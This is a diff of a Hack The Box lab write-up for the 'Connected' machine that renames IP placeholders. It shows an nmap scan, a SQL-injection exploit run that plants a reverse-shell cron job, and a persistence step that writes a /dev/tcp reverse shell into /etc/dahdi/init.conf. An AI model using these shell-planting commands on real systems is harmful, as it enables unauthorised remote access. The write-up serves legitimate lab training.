@@ -30,7 +30,7 @@ description: Connected Hack The Box writeup covering the web foothold and Dahdi 
 The full scan found three exposed TCP services:
 
 ```bash
-nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan <TARGET_IP>
+nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan LAB_IP
 ```
 
 | Port | Service | Note |
@@ -56,7 +56,7 @@ The two supplied reconnaissance screenshots are kept in sequence below.
 The source notes use a proof of concept for the SQL-injection issue. The important behavior is that the exploit inserts a temporary cron job that connects back to the operator, waits for the callback, and removes the job to avoid repeated connections.
 
 ```bash
-python3 exploit.py http://connected.htb --ip <LHOST>
+python3 exploit.py http://connected.htb --ip CALLBACK_IP
 ```
 
 A successful run reports the database version, creates the cron job and returns an interactive shell:
@@ -66,7 +66,7 @@ A successful run reports the database version, creates the cron job and returns 
 [*] Injecting reverse-shell cron job ...
 [+] Cron job 'jkbthmng' inserted (runs every minute).
 [*] Waiting for callback (up to ~70s) ...
-[+] Shell from <TARGET_IP>:<CALLBACK_PORT> !
+[+] Shell from LAB_IP:CALLBACK_PORT !
 [+] Removed cron job 'jkbthmng' (no repeat callbacks).
 ```
 
@@ -97,7 +97,7 @@ nc -lvnp 9001
 
 ```bash
 # From the asterisk shell
-printf '%s\n' 'bash -c "bash -i >& /dev/tcp/<LHOST>/9001 0>&1" &' \
+printf '%s\n' 'bash -c "bash -i >& /dev/tcp/CALLBACK_IP/9001 0>&1" &' \
   >> /etc/dahdi/init.conf
 
 echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart
